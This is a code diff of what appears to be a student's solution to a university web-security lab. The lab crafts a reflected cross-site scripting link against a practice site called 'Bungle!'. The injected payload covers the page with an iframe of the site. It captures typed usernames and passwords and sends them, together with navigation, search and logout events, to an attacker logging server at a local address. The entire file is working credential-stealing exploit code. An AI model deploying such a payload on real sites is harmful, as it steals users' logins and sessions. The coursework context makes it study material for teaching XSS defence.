@@ -1,74 +1,74 @@
 <meta charset="utf-8">
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 <script>
-// Extend this function:
+
+// Looked at iframe implementation from:
+// https://github.com/koto/blog-kotowicz-net-examples/blob/master/track-xss/track.js
 
 function payload(attacker) {
     function log(data) {
         console.log($.param(data));
         $.get(attacker, data);
     }
-    function proxy(href, state) {
-        if(state == "nav"){
-            $("html").load(href, function(){
-                $("html").show();                
-                // alert('log event');
-                log({event: state, uri: href});
-                window.history.replaceState('', "Bungle!","./search");
-            });
-        } else if(state == "login"){
-            $("html").load(state, function(){
-                $("html").show();
-                var username = $("#username").val();
-                var password = $("#userpass").val();
-                log({event: "login", user:username, pass: password});
-                // window.history.replaceState('', "Bungle!","./search");
-            });
-        } else if(state == "logout"){
-            $("html").load(href, function(){
-                $("html").show();
-                log({event: state, uri: href});
-                window.history.replaceState('', "Bungle!","./search");
-            });
+    function logNav(frameDoc, href){
+        var username;
+        if(frameDoc.find("#logged-in-user")){
+            username = frameDoc.find("#logged-in-user").html();
+            log({event: "nav", user: username, url: href });
         } else {
-            $("html").load(href, function(){
-                $("html").html($("html").html()+"<iframe id=\"frame1\" name=\"logFrame\"></iframe><form name=\"form1\" action=\"http://127.0.0.1:31337/\" method=\"get\" target=\"logFrame\"><input type=\"hidden\" name=\"work\" value=\"POOOOOOP\"></form>");
-                $("html").show();                
-                // alert('log event');
-                log({event: state, uri: href});
-                window.history.replaceState('', "Bungle!","./search");
-            });
+
+            log({event: "nav", url: href});
+
         }
     }
-    var poop = $("#POOP").html();
-    $("html").hide();
-    alert("hi");
-    proxy("./", "first");
-    
-    $(function(){
-        
-        $(".search-well form").submit(function(e){
-            alert("POOP");
-            e.preventDefault();
-            var url = "/project2/search?xssdefense=0&q=" +
-        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
-        ";payload(\"" + attacker + "\");</script" + "></div>");
-            $("html").load(url);
-            // payload(attacker);
-        });
-        $(".well form").submit(function(e){
-            alert("BUTT");
-            e.preventDefault();
-            proxy("./login", "login");
-        });
-        $("#search-again-btn").click(function(e){
-            alert("POOPING AGAIN");
-            
-            e.preventDefault();
-           // proxy("./", "nav");
+    function proxy(href) {
+        window.history.replaceState('', "Bungle!","./search");
 
+        var html = $("html").html();
+        $("html").html("<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>");
+        $("#frame1").attr("src", "http://eecs388.org/project2/");
+        $("html").show();
+        var firstLoad = true;
+        $("#frame1").load(function() {
+            var frameDoc = $(this.contentDocument);
+            frameDoc.find("a[href *= 'script']").hide();
+            if(firstLoad){
+                logNav(frameDoc, href);
+                firstLoad = false;
+            }
+            frameDoc.find('#bungle-lnk') // BUNGLE HOME
+                .click(function() {
+                    logNav(frameDoc, this.target);
+                });
+            frameDoc.find('.well form')
+                .submit(function() {
+                    var username = frameDoc.find("#username").val();
+                    var password = frameDoc.find("#userpass").val();
+                    log({event: "login", user: username, pass: password});
+                });
+            frameDoc.find('.search-well form')
+                .submit(function() {
+                    var query = href + "?q=" + frameDoc.find("#query").val();
+                    logNav(frameDoc, query);
+                    window.history.replaceState('', "Bungle!","./search?q=" + frameDoc.find("#query").val());
+
+                });
+            frameDoc.find('#search-again-btn')
+                .click(function() {
+                    logNav(frameDoc, href);
+                    window.history.replaceState('', "Bungle!","./search");
+                    
+                });
+            frameDoc.find('#log-out-btn')
+                .click(function() {
+                    var username = frameDoc.find("#logged-in-user").html();
+                    log({event: "logout", user: username});
+                });
         });
-    });
+
+    }
+    $("html").hide();
+    proxy("http://127.0.0.1:31337/");
 }
 
 
@@ -77,17 +77,19 @@ function payload(attacker) {
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-        encodeURIComponent("<div id=\"POOP\"><script" + ">" + payload.toString() +
-        ";payload(\"" + attacker + "\");</script" + "></div>");
+            encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + "></div>");
     } else {
         // Implement code to defeat XSS defenses here.
-    }
+
+    }   
 }
+
 var xssdefense = 0;
 var target = "http://eecs388.org/project2/";
 var attacker = "http://127.0.0.1:31337/";
 $(function() {
-var url = makeLink(xssdefense, target, attacker);
+    var url = makeLink(xssdefense, target, attacker);
     $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
 });
 </script>
